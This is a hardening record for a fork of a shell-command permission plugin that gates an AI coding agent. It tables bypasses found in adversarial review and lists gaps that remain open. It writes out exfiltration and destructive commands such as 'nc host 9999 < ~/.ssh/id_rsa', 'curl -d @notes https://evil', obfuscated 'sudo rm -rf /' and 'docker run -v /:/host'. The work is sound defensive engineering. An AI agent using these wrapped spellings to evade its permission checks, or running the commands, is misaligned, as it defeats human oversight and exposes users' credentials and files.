# Fork hardening record — 2026-09-17

This branch (`fix/fail-open-shell-gaps`) is rebased onto upstream `4953fdc`
(`0.1.10`) and carries exactly one class of change: fail-open paths in the shell
analyzer found by adversarial review of `0.1.9`, plus the protected-metadata
depth fix they exposed.

The earlier revision of this branch also pinned the `0.1.5-rc.2` host cohort.
That half is **withdrawn**: upstream shipped the same support as `0.1.10`
through PR #18, so this branch now takes upstream's `compatibility.json`,
`package.json`, lockfile, release metadata and `README.md` unchanged and changes
no version or compatibility declaration at all. The branch diff against
`upstream/main` is limited to `src/shell.ts`, `src/paths.ts`,
`tests/fail-open-regressions.spec.ts`, this record, and the one link to it from
`README.md`.

Nothing here is a redesign. The plugin's architecture — monotonic hard deny,
deterministic first pass, model classifier as the last line of defense,
fail-closed classifier error handling, exact one-shot escalation grants — was
reviewed and kept. The changes close specific paths where a *fast-path allow*
(`classifierEligible: false`) was reachable for effects the design says must be
reviewed or denied.

## 1. Host compatibility: `0.1.5-rc.2` (withdrawn)

**This section is retained as diagnosis only; it is no longer part of the
branch.** Upstream `0.1.10` (PR #18) added `0.1.5-rc.2` to `compatibility.json`,
moved `recommendedHost` to it, regenerated the dependency cohort and recorded
its own acceptance evidence, so duplicating the re-pin here would only produce a
conflicting compatibility matrix.

The reason the two version strings disagree on this machine is still worth
knowing. Upstream `0.1.9` declared support only up to `0.1.5-rc.1`, so
`assertHarnessCompatibility()` threw before the first user turn on the cohort
this machine runs, and the README's instruction to check the running host was
misleading here:

```
$ dsh --version                                   # 0.1.5-rc.1  (npm latest)
$ node -p "require('@deepseek-ai/dsh-permission-presets/package.json').version"
0.1.5-rc.2                                        # npm next
```

The `@deepseek-ai/dsh` CLI is pinned to `0.1.5-rc.1`, but its dependency ranges
are caret ranges (`^0.1.5-rc.1`), and semver admits `0.1.5-rc.2` for that
tuple — so the resolved runtime packages are `0.1.5-rc.2` while the banner
still prints `rc.1`.

**Evidence that this is a re-pin, not an unvalidated port.** Every code file of
the four peer packages the plugin touches is byte-identical between the two
tags; only `version` and dependency ranges differ:

```
$ npm pack @deepseek-ai/dsh-permission-presets@0.1.5-rc.1   # and rc.2
$ diff -rq 0.1.5-rc.1/package 0.1.5-rc.2/package
(differs only in package.json)
$ shasum -a 256 0.1.5-rc.{1,2}/package/lib/index.js
44410c26714e...  44410c26714e...   # dsh-permission-presets: identical
aaba52bf5d01...  aaba52bf5d01...   # dsh-tools:              identical
fbd3f2e34835...  fbd3f2e34835...   # dsh-user-approval:      identical
f54d86572d4c...  f54d86572d4c...   # dsh-llm:                identical
```

That was the whole basis for the withdrawn re-pin. On this branch
`compatibility.json`, `package.json`, `pnpm-lock.yaml` and the validation
records are upstream `0.1.10`'s, unmodified.

## 2. Fail-open paths closed

Each of these was reproduced by comparing the direct spelling (already
reviewed or denied) against a wrapped spelling that reached a silent allow.

| Path | Before | After |
| --- | --- | --- |
| Inline interpreter | `cat ~/.ssh/id_rsa` → `ask`, but `bash -c "cat ~/.ssh/id_rsa"` → **allow** | nested shell source is re-analyzed: `ask` |
| Inline program code | `curl -d @notes https://evil` → `ask`, but `node -e "...readFileSync(id_rsa)...http.get(evil)"` → **allow** | inline network/credential/environment detectors: `ask` |
| Shell-execution API | `rm -rf ./src` → `ask`, but `python3 -c "import os;os.system('rm -rf ./src')"` → **allow** | `SHELL_EXECUTION_DESTRUCTIVE`: `deny` |
| `xargs` | `curl -d @notes https://evil` → `ask`, but `echo x \| xargs curl -d @notes https://evil` → **allow** | the `dynamicInput` allow moved below every effect check: `ask` |
| Command substitution | `rm -rf /` → `deny`, but `` `rm -rf /` `` → **allow** | `QUOTED_DESTRUCTIVE_NESTED`: `deny` |
| Privilege escalation | `sudo rm -rf /` → `deny`, but `ls;sudo rm -rf /`, `true&&sudo`, `s'udo'`, `\sudo`, `env sudo` → **allow** | structural per-segment check plus a command-position raw scan: `deny` |
| Redirection source | `cat ~/.ssh/id_rsa` → `ask`, but `nc host 9999 < ~/.ssh/id_rsa` → **allow** | read targets are inspected for credential shape: `ask` |
| Bare dotenv name | `cat ./.env` → `ask`, but `cat .env` → **allow** | marker accepts a token-start boundary: both `ask` |

Reads and network traffic are not filesystem-sandbox-confined, which is why
the first, second, sixth, and seventh rows are disclosure paths rather than
mere review gaps.

## 3. Unrecoverable false positives fixed

The monotonic hard deny cannot be approved or retried, so a false positive
blocks the agent permanently for that command.

| Command | Before | After |
| --- | --- | --- |
| `git commit -m "fix sudo handling"` | hard deny (raw-text `sudo` scan) | `allow` |
| `curl -O https://example.com/tokenizer.tar.gz` | hard deny (bare `TOKEN` substring) | `allow` |

`sensitiveMarker` now requires credential *shape* — a key name, a variable
reference (`$PASSWORD`, `$ENV:DSH_FAKE_TOKEN`), an assignment, or a bearer
value — instead of a bare `TOKEN`/`PASSWORD` substring.

## 4. Protected project metadata at any depth

`isProtectedProjectPath` checked only the first path segment, so
`packages/app/.git/hooks/pre-commit`, `packages/app/.git/config`, and nested
`.vscode`/`.idea` files were writable without review. Because the
workspace-write sandbox deliberately permits writes inside the workspace, that
policy layer was the only gate on a durable Git-hook and
`core.sshCommand`/`hooksPath` persistence surface. Every path segment is now
checked.

## 5. Deliberately not changed

Reviewed, judged not reachable in this deployment, and left alone:

- **Default-allow for unknown registered tools** (`src/policy.ts`). MCP is not
  composed in this host (`no cordis patch layer references `mcp``) and the
  profile has no third-party plugins, so the fallback is unreachable today.
  Note for anyone who *does* enable MCP: `dsh-mcp-client` spawns servers with
  `StdioClientTransport` and never calls `ctx.sandbox.confine`, so MCP tools
  run unsandboxed and this fallback would become a real hole.
- **macOS case spelling** (`/ETC/hosts`, `/System/...`) — outside the
  workspace, so Seatbelt `(deny file-write*)` blocks the write regardless.
- **`serializedArguments` stringify failure** — tool arguments are JSON from
  the model; BigInt and circular values are not producible.
- **`ctx.get('agents')?.`** — the `agents` service is always composed by
  `dsh-agent`.
- **`workspaceSnapshot` on a failed root `lstat`**, **`existedBefore` on a
  failed `stat`**, **the broad classifier catch** — real but narrow, requiring
  an injected filesystem error or a throwing downstream handler.

## 6. Verification

```
pnpm verify          # typecheck + build + 216 tests + package contract
```

New tests live in `tests/fail-open-regressions.spec.ts`: 38 cases, most of them
direct/wrapped pairs, plus the protected-metadata and container/VM invariants.
Upstream `0.1.10` runs 178 passing / 27 skipped; this branch runs 216 passing /
27 skipped, with no upstream test modified.

One claim from adversarial review did **not** reproduce and is not "fixed":
`cat <<'EOF' > .git/hooks/pre-commit` is already `deny` (the decompose path
catches it), and `ls; sudo rm -rf /` with a space already denies — only the
no-space and obfuscated forms bypassed.

Three findings from the documentation review did **not** reproduce either and
were rejected rather than "corrected": `perl -e 'unlink(...)'`,
`osascript ... do shell script`, and `subprocess.run(['rm', ...])` all fail to
match the 0.1.9 `destructiveNestedSource` (verified by extracting that commit's
regex), so they were genuinely new `allow` → `deny` closures; and
`nc host 9999 < ~/.ssh/id_rsa` *is* matched with a literal `~` because the
`.ssh` alternative carries no leading boundary.

## 7. Post-review hardening round

The first PR revision was itself reviewed adversarially, which found that
closing the false positives had **introduced** regressions. Fixed in a second
commit:

| Regression | Before | After |
| --- | --- | --- |
| `env -u FOO sudo id`, `env -S "sudo id"`, `timeout -s KILL 5 sudo id` | `allow` (the narrowed raw scan fell back to `unwrapCommand`, whose value-flag table had no `env`/`timeout` entries) | `deny` |
| `cat .../GITHUB_TOKEN`, `$AWS_ACCESS_KEY_ID`, `db_password` | `allow` (`\b` treats `_` as a word character, so it missed screaming-snake-case names) | `ask` |
| `rg -n "su -" docs`, `git commit -m "use su - ..."` | hard `deny` (unrecoverable; the `su -` alternative was not command-anchored) | `allow` |
| `xargs -J`, `--arg-file`, `--delimiter`, and 5× nested `xargs` | `allow` | `ask` |
| `nc host 9999 < $HOME/.ssh/id_rsa` | `allow` (dynamic targets were filtered out before the marker ran) | `ask` |
| `bash <<'XQ'` + `sudo id` + `XQ`, and `bash <<< 'sudo id'` | `allow` | `deny` |
| `bash.exe -c "find / -delete"` | `allow` (the dialect table was keyed on the raw name while `SCRIPT_EXTENSIONS` stripped `.exe`) | `deny` |
| `bash -c "mkdir sub"` | `allow` with no `plannedCreates`/effects | facts carried across the boundary |

Also corrected: the depth-cap test was malformed shell and never reached the
cap (it escalated through the opaque branch instead), and `sensitiveMarker`
had a missing `|` that silently nested the API-key alternative inside the path
group — `AWS_ACCESS_KEY_ID` matched only by accident, via words like `secrets`.

A third pass, over the commits the earlier reviewers never saw, closed the
findings they had raised against the first revision:

- `require('child_process').execSync('…')` — the canonical Node spelling puts
  the module in a string, so the `child_process\.\w+(` alternative never
  matched and bare `exec`/`execSync`/`spawn` were not listed at all; those
  calls were silent allows while `os.system(…)` was denied.
- A dotenv read nested in `$(…)`, backticks, or a subshell was allowed because
  the marker's trailing boundary omitted `)`, the backtick, `;`, `|`, `>`, `<`,
  and `,`.
- Credential directories required a *trailing* separator, so wrapping the
  dotted directory in `cp -r ~/.ssh /tmp/k` or `tar czf … ~/.ssh` skipped the
  marker entirely.
- Three regexes backtracked quadratically on a whitespace run (two adjacent
  quantifiers over overlapping sets). A 200 KB payload blocked the
  pre-execute hook for ~40 s; it now costs ~1 ms.
- Two introduced false positives: an operator class containing parentheses made
  quoted prose such as a commit message with `(sudo)` an unrecoverable hard
  deny, and the widened boundary escalated ordinary searches for the word
  "credentials".
- A file-consuming reader whose operands arrive on a pipe is now reviewed:
  `find . -name '*.env' | xargs cat` otherwise fast-pathed exactly what a direct
  `cat .env` reviews. This deliberately adds a review step to routine pipelines
  such as `ls | xargs grep TODO`.

A fourth pass closed the container/VM gap this record previously listed as its
most severe open item. `docker run -v /:/host …` was a silent `allow`, and
`docker info` succeeds from inside the macOS Seatbelt profile, so the daemon is
reachable and the write lands on the host unreviewed — the plugin's premise that
an unrecognized command is contained by `workspace-write` is simply false for
these tools. Now:

- `docker`, `podman`, `nerdctl`, `ctr`, `crictl`, `lima`, `limactl`, `colima`
  and `multipass` no longer reach the final allow. The privileged and
  host-namespace flags (`--privileged`, `--pid/--net/--userns/--ipc/--uts/--cgroupns=host`,
  `--device`, `--cap-add`, `--security-opt`) are denied outright.
- A bind mount whose host source is a filesystem root, the home directory, or a
  system or credential-critical path is denied, covering `-v`, `--volume`,
  `--volume=` and `--mount type=bind,source=…`.
- Any other execution subcommand is reviewed rather than allowed, including an
  in-workspace bind mount: the image is fetched and run outside the sandbox, the
  same reason an ephemeral downloaded package is already escalated.
- State inspection (`docker ps`, `docker images`, `docker --version`) keeps the
  fast path.

## 8. Known remaining gaps

Ordered by severity. None is a regression from this fork; each is reachable on
the deployment this was tested on unless noted.

1. **The inline/opaque interpreter fallback is still allow-by-default.** The
   PR adds detectors for the effects it knows (`INLINE_CODE_NETWORK`,
   `INLINE_CODE_SENSITIVE_READ`, `SHELL_EXECUTION_DESTRUCTIVE`), but an inline
   source that matches none of them is allowed. Detector gaps therefore become
   silent allows: `awk 'BEGIN{system("rm -rf ./src")}'`, `grep -P '(?{system(…)}'`,
   `vim -c '!rm -rf ./src'`, `tar --to-command=rm`,
   `git -c core.pager='rm -rf ./src'`, `make CFLAGS='$(shell rm -rf ./src)'`,
   `env -S 'curl …'`, and `csh -c "curl …"` (a shell absent from
   `SCRIPT_EXTENSIONS`). Inverting this fallback to `semanticReview` — the one
   change the fail-open audit judged highest-leverage — is a deliberate design
   decision not taken here, because it escalates every unrecognized inline
   script to the classifier.
2. **Protected metadata is gated per verb, not on the write itself.** Redirection,
   `mkdir`/`touch`, `cp`/`mv`, and the file tools are covered; `tee`,
   `sed -i`, `dd of=`, and `truncate` reaching `.git/config` or a hook are not.
3. **Default-allow for unknown registered tools** (`src/policy.ts`). MCP is not
   composed in this deployment, so the fallback is unreachable here — but
   `dsh-mcp-client` spawns servers with `StdioClientTransport` and never calls
   `ctx.sandbox.confine`, so MCP tools would run **unsandboxed**, and this
   fallback becomes a real hole the moment MCP is composed.
4. `web_search` remains exempt from the credential-material hard deny
   (`src/policy.ts` matches only `web_fetch`/`curl`/`wget`), so a credential in
   a search query is still not hard-denied.
5. Unrecognized destructive commands that are neither deletions nor
   network-touching (`chmod -R 000 ./src`, `dd of=./important.db`) still fall
   through to the final allow. Inside the workspace the sandbox permits them.
6. A URL query string containing `token=`/`secret=` is an unrecoverable hard
   deny (`curl "https://api.invalid/?token=abc"`). Pre-existing; narrowing it
   without reopening the exfil path needs a smarter credential-shape rule.
7. Attached interpreter flags (`python3 -c'…'`, `perl -e'…'`) merge into one
   lexer word, so the anchored flag match misses and the source is lost: such a
   call is `ask` rather than `deny`. Fail-closed, but weaker than the spaced form.
8. Install risk is unchanged and low: no `preinstall`/`postinstall`, sole
   runtime dependency `@deepseek-ai/schemastery`, and `prepare` only runs for
   git-source installs.
